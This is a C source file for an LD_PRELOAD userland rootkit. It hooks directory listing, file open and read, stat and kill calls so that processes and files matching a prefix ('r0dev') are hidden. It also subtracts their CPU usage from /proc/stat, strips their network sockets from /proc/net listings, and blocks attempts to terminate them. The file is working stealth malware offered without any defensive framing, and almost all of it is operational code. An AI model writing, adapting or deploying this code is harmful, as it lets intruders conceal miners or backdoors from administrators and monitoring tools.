#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdarg.h>

#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif

static char PREFIX[64] = "r0dev";

static struct dirent *(*real_readdir)(DIR *) = NULL;
static struct dirent64 *(*real_readdir64)(DIR *) = NULL;
static int (*real_kill)(pid_t, int) = NULL;
static int (*real_open)(const char *, int, ...) = NULL;
static int (*real_openat)(int, const char *, int, ...) = NULL;
static ssize_t (*real_read)(int, void *, size_t) = NULL;
static FILE *(*real_fopen)(const char *, const char *) = NULL;
static ssize_t (*real_readlink)(const char *, char *, size_t) = NULL;
static int (*real_stat)(const char *, struct stat *) = NULL;
static int (*real_lstat)(const char *, struct stat *) = NULL;
static int (*real_fstatat)(int, const char *, struct stat *, int) = NULL;

static int has_prefix(const char *s) {
    if (!s || !*PREFIX) return 0;
    size_t plen = strlen(PREFIX);
    while (*s) {
        if ((*s | 32) == (PREFIX[0] | 32)) {
            if (strncasecmp(s, PREFIX, plen) == 0)
                return 1;
        }
        s++;
    }
    return 0;
}

static int pid_has_prefix(int pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[256] = {0};
    real_read(fd, buf, sizeof(buf) - 1);
    close(fd);
    return has_prefix(buf);
}

// === CPU HIDING ===

static long cach_ut = 0, cach_st = 0;
static time_t cach_time = 0;

static void refresh_cache(void) {
    cach_ut = cach_st = 0;
    int fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return;
    char buf[16384];
    int n;
    while ((n = syscall(SYS_getdents64, fd, buf, sizeof(buf))) > 0) {
        off_t off = 0;
        while (off < n) {
            struct dirent64 *de = (struct dirent64 *)(buf + off);
            char *end;
            long pid = strtol(de->d_name, &end, 10);
            if (*end == '\0' && pid > 0) {
                char path[64];
                snprintf(path, sizeof(path), "/proc/%ld/cmdline", pid);
                int cf = syscall(SYS_open, path, O_RDONLY, 0);
                if (cf >= 0) {
                    char cb[256] = {0};
                    syscall(SYS_read, cf, cb, sizeof(cb) - 1);
                    syscall(SYS_close, cf);
                    if (has_prefix(cb)) {
                        char sp[64];
                        snprintf(sp, sizeof(sp), "/proc/%ld/stat", pid);
                        int sf = syscall(SYS_open, sp, O_RDONLY, 0);
                        if (sf >= 0) {
                            char sb[512] = {0};
                            syscall(SYS_read, sf, sb, sizeof(sb) - 1);
                            syscall(SYS_close, sf);
                            long u, s;
                            if (sscanf(sb, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu", &u, &s) >= 2) {
                                cach_ut += u; cach_st += s;
                            }
                        }
                    }
                }
            }
            off += de->d_reclen;
        }
    }
    syscall(SYS_close, fd);
    cach_time = time(NULL);
}

static char *get_modified_stat(void) {
    time_t now = time(NULL);
    if (now - cach_time > 5) refresh_cache();
    int fd = real_open("/proc/stat", O_RDONLY);
    if (fd < 0) return NULL;
    char *buf = malloc(16384);
    if (!buf) { close(fd); return NULL; }
    int n = real_read(fd, buf, 16383);
    close(fd);
    if (n <= 0) { free(buf); return NULL; }
    buf[n] = 0;
    if (cach_ut + cach_st > 0) {
        char *cpu_line = strstr(buf, "cpu ");
        if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
            long u, ns, s, i, w, x, y, z;
            if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                       &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                u -= cach_ut; if (u < 0) u = 0;
                s -= cach_st; if (s < 0) s = 0;
                char newline[256];
                int nl = snprintf(newline, sizeof(newline),
                    "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                memcpy(cpu_line, newline, nl);
            }
        }
    }
    return buf;
}

// === NETWORK CONNECTION HIDING ===

static int is_net_tcp_path(const char *path) {
    if (!path) return 0;
    return strcmp(path, "/proc/net/tcp") == 0 ||
           strcmp(path, "/proc/net/tcp6") == 0 ||
           strcmp(path, "/proc/net/udp") == 0;
}



static int get_hidden_inodes(unsigned long *inodes, int max) {
    int count = 0;
    int fd = syscall(SYS_open, "/proc", O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return 0;
    char buf[16384];
    int n;
    while ((n = syscall(SYS_getdents64, fd, buf, sizeof(buf))) > 0 && count < max) {
        off_t off = 0;
        while (off < n && count < max) {
            struct dirent64 *de = (struct dirent64 *)(buf + off);
            char *end;
            long pid = strtol(de->d_name, &end, 10);
            if (*end == '\0' && pid > 0) {
                char cmdline[64];
                snprintf(cmdline, sizeof(cmdline), "/proc/%ld/cmdline", pid);
                int cf = syscall(SYS_open, cmdline, O_RDONLY, 0);
                if (cf >= 0) {
                    char cb[256] = {0};
                    syscall(SYS_read, cf, cb, sizeof(cb) - 1);
                    syscall(SYS_close, cf);
                    if (has_prefix(cb)) {
                        char fdpath[64];
                        snprintf(fdpath, sizeof(fdpath), "/proc/%ld/fd", pid);
                        int fdf = syscall(SYS_open, fdpath, O_RDONLY | O_DIRECTORY, 0);
                        if (fdf >= 0) {
                            char fdbuf[4096];
                            int fn;
                            while ((fn = syscall(SYS_getdents64, fdf, fdbuf, sizeof(fdbuf))) > 0 && count < max) {
                                off_t foff = 0;
                                while (foff < fn && count < max) {
                                    struct dirent64 *fde = (struct dirent64 *)(fdbuf + foff);
                                    if (strcmp(fde->d_name, ".") != 0 && strcmp(fde->d_name, "..") != 0) {
                                        char link[256] = {0};
                                        char linkpath[384];
                                        snprintf(linkpath, sizeof(linkpath), "/proc/%ld/fd/%s", pid, fde->d_name);
                                        ssize_t l = readlink(linkpath, link, sizeof(link) - 1);
                                        if (l > 0) {
                                            link[l] = 0;
                                            if (strncmp(link, "socket:[", 8) == 0) {
                                                inodes[count++] = strtoul(link + 8, NULL, 10);
                                            }
                                        }
                                    }
                                    foff += fde->d_reclen;
                                }
                            }
                            syscall(SYS_close, fdf);
                        }
                    }
                }
            }
            off += de->d_reclen;
        }
    }
    syscall(SYS_close, fd);
    return count;
}

static char *filter_net_tcp_content(const char *content, size_t len, size_t *new_len) {
    unsigned long inodes[256];
    int nin = get_hidden_inodes(inodes, 256);
    if (nin == 0) return NULL;

    char *result = malloc(len + 1);
    if (!result) return NULL;

    const char *p = content;
    const char *end = content + len;
    char *out = result;
    int line = 0;

    while (p < end) {
        const char *nl = memchr(p, '\n', end - p);
        size_t llen = nl ? (size_t)(nl - p) : (size_t)(end - p);

        if (line == 0) {
            memcpy(out, p, llen + 1);
            out += llen + 1;
        } else {
            int field = 0, in_field = 0;
            const char *inode_start = NULL;
            int hide = 0;

            for (const char *c = p; c < p + llen; c++) {
                if (*c == ' ' || *c == '\t') {
                    in_field = 0;
                } else if (!in_field) {
                    in_field = 1;
                    field++;
                    if (field == 10) inode_start = c;
                }
            }

            if (inode_start) {
                unsigned long ino = strtoul(inode_start, NULL, 10);
                for (int i = 0; i < nin; i++) {
                    if (inodes[i] == ino) { hide = 1; break; }
                }
            }

            if (!hide) {
                memcpy(out, p, llen + 1);
                out += llen + 1;
            }
        }
        line++;
        p += llen;
        if (*p == '\n') p++;
    }

    *out = 0;
    if (new_len) *new_len = (size_t)(out - result);
    return result;
}

// === READDIR HOOKS ===

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real_readdir(dirp)) != NULL) {
        if (has_prefix(e->d_name)) continue;
        if (e->d_type == DT_DIR) {
            char *end;
            long pid = strtol(e->d_name, &end, 10);
            if (*end == '\0' && pid > 0 && pid_has_prefix((int)pid))
                continue;
        }
        break;
    }
    return e;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real_readdir64(dirp)) != NULL) {
        if (has_prefix(e->d_name)) continue;
        if (e->d_type == DT_DIR) {
            char *end;
            long pid = strtol(e->d_name, &end, 10);
            if (*end == '\0' && pid > 0 && pid_has_prefix((int)pid))
                continue;
        }
        break;
    }
    return e;
}

// === OPEN HOOKS ===

static int openproc_fallback(const char *path, int flags, va_list ap, int use_at) {
    mode_t m = 0;
    if (flags & O_CREAT) { va_list ap2; va_copy(ap2, ap); m = va_arg(ap2, mode_t); va_end(ap2); }
    if (use_at) return real_openat(AT_FDCWD, path, flags, m);
    return real_open(path, flags, m);
}

int open(const char *path, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");

    if (!(flags & O_WRONLY)) {
        if (strcmp(path, "/proc/stat") == 0) {
            char *content = get_modified_stat();
            if (content) {
                int fd = syscall(SYS_memfd_create, ".stat", 0);
                if (fd >= 0) {
                    write(fd, content, strlen(content));
                    lseek(fd, 0, SEEK_SET);
                    free(content);
                    return fd;
                }
                free(content);
            }
        } else if (is_net_tcp_path(path)) {
            int rf = real_open(path, flags, 0);
            if (rf >= 0) {
                char content[65536];
                int n = real_read(rf, content, sizeof(content) - 1);
                close(rf);
                if (n > 0) {
                    content[n] = 0;
                    size_t nl;
                    char *filtered = filter_net_tcp_content(content, n, &nl);
                    if (filtered) {
                        int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
                        if (mfd >= 0) {
                            write(mfd, filtered, nl);
                            lseek(mfd, 0, SEEK_SET);
                            free(filtered);
                            return mfd;
                        }
                        free(filtered);
                    } else {
                    }
                }
            }
        }
    }

    va_list ap; va_start(ap, flags);
    int ret = openproc_fallback(path, flags, ap, 0);
    va_end(ap);
    return ret;
}

int openat(int dirfd, const char *path, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");

    if (!(flags & O_WRONLY)) {
        if (strcmp(path, "/proc/stat") == 0) {
            char *content = get_modified_stat();
            if (content) {
                int fd = syscall(SYS_memfd_create, ".stat", 0);
                if (fd >= 0) {
                    write(fd, content, strlen(content));
                    lseek(fd, 0, SEEK_SET);
                    free(content);
                    return fd;
                }
                free(content);
            }
        } else if (is_net_tcp_path(path)) {
            int rf = real_openat(dirfd, path, flags, 0);
            if (rf >= 0) {
                char content[65536];
                int n = real_read(rf, content, sizeof(content) - 1);
                close(rf);
                if (n > 0) {
                    content[n] = 0;
                    size_t nl;
                    char *filtered = filter_net_tcp_content(content, n, &nl);
                    if (filtered) {
                        int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
                        if (mfd >= 0) {
                            write(mfd, filtered, nl);
                            lseek(mfd, 0, SEEK_SET);
                            free(filtered);
                            return mfd;
                        }
                        free(filtered);
                    }
                }
            }
        }
    }

    va_list ap; va_start(ap, flags);
    int ret = openproc_fallback(path, flags, ap, 1);
    va_end(ap);
    return ret;
}

FILE *fopen(const char *path, const char *mode) {
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");

    if (mode[0] == 'r') {
        if (strcmp(path, "/proc/stat") == 0) {
            time_t now = time(NULL);
            if (now - cach_time > 5) refresh_cache();

            FILE *f = real_fopen(path, mode);
            if (!f) return f;

            char buf[8192];
            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
            fclose(f);
            buf[n] = 0;

            if (cach_ut + cach_st > 0) {
                char *cpu_line = strstr(buf, "cpu ");
                if (cpu_line && (cpu_line == buf || cpu_line[-1] == '\n')) {
                    long u, ns, s, i, w, x, y, z;
                    if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                               &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                        u -= cach_ut; if (u < 0) u = 0;
                        s -= cach_st; if (s < 0) s = 0;
                        char nl[256];
                        int nlen = snprintf(nl, sizeof(nl),
                            "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                        memcpy(cpu_line, nl, nlen);
                    }
                }
            }

            FILE *tmp = tmpfile();
            if (tmp) { fwrite(buf, 1, strlen(buf), tmp); rewind(tmp); return tmp; }
            return NULL;
        } else if (is_net_tcp_path(path)) {
            int rfd = syscall(SYS_open, path, O_RDONLY, 0);
            if (rfd < 0) return real_fopen(path, mode);
            char buf[131072];
            int total = 0;
            while (total < (int)sizeof(buf) - 1) {
                int n = syscall(SYS_read, rfd, buf + total, sizeof(buf) - total - 1);
                if (n <= 0) break;
                total += n;
            }
            syscall(SYS_close, rfd);
            if (total > 0) {
                buf[total] = 0;
                size_t nl;
                char *filtered = filter_net_tcp_content(buf, total, &nl);
                if (filtered) {
                    int mfd = syscall(SYS_memfd_create, ".nettcp", 0);
                    if (mfd >= 0) {
                        syscall(SYS_write, mfd, filtered, nl);
                        lseek(mfd, 0, SEEK_SET);
                        free(filtered);
                        return fdopen(mfd, "r");
                    }
                    free(filtered);
                }
            }
            return real_fopen(path, mode);
        }
    }
    return real_fopen(path, mode);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!real_read) real_read = dlsym(RTLD_NEXT, "read");
    if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");

    ssize_t ret = real_read(fd, buf, count);
    if (ret <= 0) return ret;

    char link[256] = {0};
    char proc_fd[64];
    snprintf(proc_fd, sizeof(proc_fd), "/proc/self/fd/%d", fd);
    if (real_readlink(proc_fd, link, sizeof(link)) > 0) {
        if (strstr(link, "/proc/stat")) {
            time_t now = time(NULL);
            if (now - cach_time > 5) refresh_cache();

            if (cach_ut + cach_st > 0) {
                char *data = (char *)buf;
                char *cpu_line = strstr(data, "cpu ");
                if (cpu_line && ret > 6) {
                    long u, ns, s, i, w, x, y, z;
                    if (sscanf(cpu_line, "cpu  %ld %ld %ld %ld %ld %ld %ld %ld",
                               &u, &ns, &s, &i, &w, &x, &y, &z) >= 4) {
                        u -= cach_ut; if (u < 0) u = 0;
                        s -= cach_st; if (s < 0) s = 0;
                        char nb[256];
                        int nl = snprintf(nb, sizeof(nb),
                            "cpu  %ld %ld %ld %ld %ld %ld %ld %ld\n", u, ns, s, i, w, x, y, z);
                        memcpy(cpu_line, nb, nl < ret ? nl : ret);
                    }
                }
            }
        } else if (strstr(link, "/proc/net/tcp") || strstr(link, "/proc/net/tcp6") || strstr(link, "/proc/net/udp")) {
            size_t nl;
            char *filtered = filter_net_tcp_content(buf, ret, &nl);
            if (filtered) {
                size_t cp = nl < (size_t)ret ? nl : (size_t)ret;
                memcpy(buf, filtered, cp);
                free(filtered);
                return (ssize_t)cp;
            }
        }
    }
    return ret;
}

// === KILL HOOK ===

int kill(pid_t pid, int sig) {
    if (!real_kill) real_kill = dlsym(RTLD_NEXT, "kill");
    if ((sig == SIGKILL || sig == SIGTERM) && pid > 0 && pid_has_prefix(pid))
        return 0;
    return real_kill(pid, sig);
}

// === STAT HOOKS ===

int stat(const char *path, struct stat *buf) {
    if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    if (!real_lstat) real_lstat = dlsym(RTLD_NEXT, "lstat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_lstat(path, buf);
}

int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {
    if (!real_fstatat) real_fstatat = dlsym(RTLD_NEXT, "fstatat");
    if (has_prefix(path)) { errno = ENOENT; return -1; }
    return real_fstatat(dirfd, path, buf, flags);
}

// === INIT ===

static void read_prefix_from_env(void) {
    char *env = getenv("R0DEV_PREFIX");
    if (env && *env) {
        size_t len = strlen(env);
        if (len >= sizeof(PREFIX)) len = sizeof(PREFIX) - 1;
        memcpy(PREFIX, env, len);
        PREFIX[len] = 0;
    }
}

static void __attribute__((constructor)) init(void) {
    read_prefix_from_env();
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    real_kill = dlsym(RTLD_NEXT, "kill");
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_read = dlsym(RTLD_NEXT, "read");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_readlink = dlsym(RTLD_NEXT, "readlink");
    real_stat = dlsym(RTLD_NEXT, "stat");
    real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_fstatat = dlsym(RTLD_NEXT, "fstatat");
}
